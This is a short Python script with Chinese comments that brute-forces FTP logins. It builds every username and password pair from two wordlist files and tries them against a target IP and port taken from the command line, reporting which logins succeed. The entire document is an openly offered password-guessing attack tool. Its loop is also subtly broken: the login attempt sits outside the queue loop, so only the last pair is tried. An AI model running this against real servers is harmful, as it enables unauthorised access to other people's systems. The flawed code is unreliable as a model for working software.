import ftplib,sys
import threading
import queue
# 简单的模拟登录测试
# 爆破：ip,端口，用户名，密码字典
def ftp_brute(ip,port):
    ftp = ftplib.FTP()
    ftp.connect(ip, port)
    while not q.empty():
        userpass = q.get()
        userpass = userpass.split('|')
        username=userpass[0]
        password=userpass[1]
        # print(username+'  |  '+password)
    try:
        ftp.login(username,password)
        # list = ftp.retrlines('list')
        print(username+"|"+password+'    OK!')
    except ftplib.all_errors:
        print(username + "|" + password + '    NO!')
        pass

if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    # userfile = sys.argv[3]
    # passfile=sys.argv[4]
    q = queue.Queue()
    for username in open('userfile.txt'):
        for password in open('passfile.txt'):
            username=username.replace('\n','')
            password=password.replace('\n','')
            q.put(username+'|'+password)

    for x in range(1):
        t = threading.Thread(target=ftp_brute, args=(ip,int(port)))
        t.start()

    # ftp_brute("10.131.20.23",21)
    # print(ip+port+userfile+passfile)